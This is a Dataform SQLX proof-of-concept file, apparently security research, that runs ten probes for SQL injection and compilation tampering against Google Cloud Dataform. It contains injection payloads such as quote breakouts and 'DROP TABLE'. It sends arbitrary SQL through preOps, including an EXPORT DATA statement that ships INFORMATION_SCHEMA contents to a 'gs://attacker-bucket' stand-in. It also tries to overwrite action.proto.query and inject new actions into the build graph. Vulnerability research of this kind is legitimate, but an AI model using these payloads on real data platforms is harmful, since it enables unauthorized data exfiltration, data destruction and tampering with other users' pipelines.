config { type: "view", name: "sql_injection_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "SQL injection through Dataform compilation output"
  };

  // =============================================================================
  // TEST 1: Template Literal Escape Analysis
  // =============================================================================
  results.test1_templateEscape = {};
  try {
    // The output uses: SELECT '${JSON.stringify(results)}' as column
    // Can we break out of this?

    const escapeTests = {};

    // Test various escape sequences
    escapeTests.singleQuote = "test'test";
    escapeTests.doubleQuote = 'test"test';
    escapeTests.backtick = "test`test";
    escapeTests.dollarBrace = "test${1+1}test";
    escapeTests.backslash = "test\\test";
    escapeTests.newline = "test\ntest";
    escapeTests.nullByte = "test\x00test";
    escapeTests.unicode = "test\u0027test"; // Unicode single quote

    results.test1_templateEscape = {
      status: "completed",
      escapeTests,
      note: "Check compiled SQL to see how these are handled"
    };
  } catch(e) {
    results.test1_templateEscape = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: JSON.stringify Bypass Attempts
  // =============================================================================
  results.test2_jsonBypass = {};
  try {
    const bypassTests = {};

    // Objects with toJSON that return malicious strings
    const evilObj = {
      toJSON: function() {
        return "'; SELECT SESSION_USER(); --";
      }
    };
    bypassTests.toJSONResult = JSON.stringify(evilObj);

    // Circular reference handling
    try {
      const circular = {};
      circular.self = circular;
      bypassTests.circularResult = JSON.stringify(circular);
    } catch(e) {
      bypassTests.circularError = e.message.substring(0, 100);
    }

    // Prototype pollution of JSON.stringify
    const originalStringify = JSON.stringify;
    bypassTests.stringifyModifiable = JSON.stringify !== originalStringify;

    results.test2_jsonBypass = {
      status: "completed",
      bypassTests
    };
  } catch(e) {
    results.test2_jsonBypass = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: SQLX Config Injection
  // =============================================================================
  results.test3_configInjection = {};
  try {
    // The config block at the top can include various properties
    // Can we inject through config?

    results.test3_configInjection = {
      status: "completed",
      note: "Config injection would require modifying the .sqlx file itself",
      potentialVectors: [
        "config.name with special characters",
        "config.description with SQL",
        "config.tags array with payloads",
        "config.dependencies manipulation"
      ]
    };
  } catch(e) {
    results.test3_configInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Multi-Statement Injection via preOps
  // =============================================================================
  results.test4_preOpsInjection = {};
  try {
    if (typeof preOps !== 'function') {
      results.test4_preOpsInjection = { error: "preOps not available" };
    } else {
      // preOps runs before the main query
      const injectionPayloads = [
        "CREATE OR REPLACE TABLE `shir-research-3.dataform_poc.exfil` AS SELECT SESSION_USER() as sa",
        "INSERT INTO `shir-research-3.dataform_poc.exfil` SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.TABLES`",
        "EXPORT DATA OPTIONS(uri='gs://attacker-bucket/data-*.json', format='JSON') AS SELECT * FROM INFORMATION_SCHEMA.TABLES"
      ];

      const preOpsResults = {};
      for (let i = 0; i < injectionPayloads.length; i++) {
        try {
          preOps(injectionPayloads[i]);
          preOpsResults['payload_' + i] = { success: true };
        } catch(e) {
          preOpsResults['payload_' + i] = { error: e.message.substring(0, 100) };
        }
      }

      results.test4_preOpsInjection = {
        status: "completed",
        preOpsResults,
        note: "If preOps succeeds, these SQL statements will be compiled into the action"
      };
    }
  } catch(e) {
    results.test4_preOpsInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: ref() SQL Injection
  // =============================================================================
  results.test5_refInjection = {};
  try {
    if (typeof ref !== 'function') {
      results.test5_refInjection = { error: "ref not available" };
    } else {
      const refInjectionTests = {};

      // Try SQL injection through ref() table names
      const injectionRefs = [
        "test`; DROP TABLE x; --",
        "test' OR '1'='1",
        "test\"; SELECT 1; --",
        "`shir-research-3`.`dataform_poc`.`simple_test`",  // Pre-escaped
        "test${process.env.HOME}",
        "test\x00hidden"
      ];

      for (const r of injectionRefs) {
        try {
          const result = ref(r);
          refInjectionTests[r.substring(0, 30)] = {
            success: true,
            result: String(result).substring(0, 200)
          };
        } catch(e) {
          refInjectionTests[r.substring(0, 30)] = {
            success: false,
            error: e.message.substring(0, 100)
          };
        }
      }

      results.test5_refInjection = {
        status: "completed",
        refInjectionTests
      };
    }
  } catch(e) {
    results.test5_refInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: self() Function Analysis
  // =============================================================================
  results.test6_selfAnalysis = {};
  try {
    if (typeof self !== 'function') {
      results.test6_selfAnalysis = { error: "self not available as function" };
    } else {
      const selfTests = {};

      selfTests.signature = {
        length: self.length,
        toString: self.toString().substring(0, 500)
      };

      try {
        const result = self();
        selfTests.callResult = {
          type: typeof result,
          value: String(result).substring(0, 200)
        };
      } catch(e) {
        selfTests.callError = e.message.substring(0, 100);
      }

      results.test6_selfAnalysis = {
        status: "completed",
        selfTests
      };
    }
  } catch(e) {
    results.test6_selfAnalysis = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: Output Query Manipulation
  // =============================================================================
  results.test7_outputManip = {};
  try {
    // Can we affect the final SELECT statement?

    const manipTests = {};

    // Check if we can add UNION statements
    manipTests.unionAttempt = "This string won't affect SQL, but...";

    // The real injection would be if we could control the outer SQL
    // Let's see what we can do with the proto object

    if (dataform && dataform.actions) {
      for (const action of dataform.actions) {
        if (action.name === 'sql_injection_exploit') {
          manipTests.ourAction = {
            type: action.type,
            keys: Object.keys(action).slice(0, 15),
            protoKeys: action.proto ? Object.keys(action.proto).slice(0, 15) : null
          };

          // Can we modify proto.query?
          if (action.proto) {
            const originalQuery = action.proto.query;
            manipTests.protoQueryType = typeof action.proto.query;
            manipTests.protoQueryModifiable = !Object.isFrozen(action.proto);

            try {
              action.proto.query = "SELECT * FROM `shir-research-3.region-us.INFORMATION_SCHEMA.TABLES`";
              manipTests.queryModified = action.proto.query !== originalQuery;
            } catch(e) {
              manipTests.queryModifyError = e.message.substring(0, 100);
            }
          }
          break;
        }
      }
    }

    results.test7_outputManip = {
      status: "completed",
      manipTests
    };
  } catch(e) {
    results.test7_outputManip = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: Dataform Compilation Phases
  // =============================================================================
  results.test8_compilationPhases = {};
  try {
    // Dataform compiles in phases. Can we affect later phases?

    const phaseTests = {};

    // Check for compile-time hooks
    if (typeof before !== 'undefined') phaseTests.beforeHook = typeof before;
    if (typeof after !== 'undefined') phaseTests.afterHook = typeof after;
    if (typeof compile !== 'undefined') phaseTests.compile = typeof compile;

    // Check for graph manipulation
    if (dataform) {
      phaseTests.graphManipulation = {
        actionsModifiable: !Object.isFrozen(dataform.actions),
        actionsLength: dataform.actions?.length,
        canPush: typeof dataform.actions?.push === 'function'
      };

      // Try adding a new action
      if (Array.isArray(dataform.actions)) {
        try {
          const fakeAction = {
            type: 'view',
            name: 'injected_action',
            proto: {
              query: "SELECT * FROM INFORMATION_SCHEMA.TABLES"
            }
          };
          const originalLength = dataform.actions.length;
          dataform.actions.push(fakeAction);
          phaseTests.actionInjected = dataform.actions.length > originalLength;
        } catch(e) {
          phaseTests.actionInjectionError = e.message.substring(0, 100);
        }
      }
    }

    results.test8_compilationPhases = {
      status: "completed",
      phaseTests
    };
  } catch(e) {
    results.test8_compilationPhases = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 9: When() / Incremental Condition Injection
  // =============================================================================
  results.test9_conditionalInjection = {};
  try {
    const conditionalTests = {};

    // Check when() function
    if (typeof when === 'function') {
      conditionalTests.whenSignature = {
        length: when.length,
        toString: when.toString().substring(0, 300)
      };
    }

    // Check incremental()
    if (typeof incremental === 'function') {
      conditionalTests.incrementalSignature = {
        length: incremental.length,
        toString: incremental.toString().substring(0, 300)
      };

      // incremental() can include SQL conditions
      try {
        const inc = incremental();
        conditionalTests.incrementalResult = {
          type: typeof inc,
          value: String(inc).substring(0, 200)
        };
      } catch(e) {
        conditionalTests.incrementalError = e.message.substring(0, 100);
      }
    }

    results.test9_conditionalInjection = {
      status: "completed",
      conditionalTests
    };
  } catch(e) {
    results.test9_conditionalInjection = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 10: Direct SQL Block Injection
  // =============================================================================
  results.test10_directSQL = {};
  try {
    // In SQLX, the SQL after the js block is the main query
    // Can we affect it from within js?

    results.test10_directSQL = {
      status: "completed",
      note: "Direct SQL manipulation would require the js block output to affect parsing",
      finding: "The js block runs, then the SQL template is processed with ${} substitutions"
    };

    // What if we output SQL directly?
    // The SELECT statement below will include whatever we put in results
  } catch(e) {
    results.test10_directSQL = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // CRITICAL TEST: Try to Break Out of String Context
  // =============================================================================
  results.CRITICAL_breakout = {};
  try {
    // The output is: SELECT '${JSON.stringify(results, null, 2)}' as column
    // If we can make JSON.stringify output something that breaks the quote...

    // This won't work because JSON.stringify escapes quotes
    // But what if we use a replacer function?

    results.CRITICAL_breakout = {
      attempt: "'; SELECT SESSION_USER() as pwned; SELECT '",
      note: "JSON.stringify will escape this, but worth checking the output"
    };

    // What about affecting the column name?
    // The column name is hardcoded as "sql_injection_exploit"

  } catch(e) {
    results.CRITICAL_breakout = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 10,
    completedTests: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Check for action injection
  if (results.test8_compilationPhases?.phaseTests?.actionInjected) {
    results.summary.criticalFindings.push("CRITICAL: Can inject new actions into dataform.actions!");
  }

  // Check for proto modification
  if (results.test7_outputManip?.manipTests?.queryModified) {
    results.summary.criticalFindings.push("CRITICAL: Can modify action.proto.query!");
  }

  // Check for preOps success
  if (results.test4_preOpsInjection?.preOpsResults) {
    const ops = results.test4_preOpsInjection.preOpsResults;
    const succeeded = Object.values(ops).filter(v => v.success);
    if (succeeded.length > 0) {
      results.summary.criticalFindings.push("preOps accepts arbitrary SQL: " + succeeded.length + " payloads");
    }
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as sql_injection_exploit
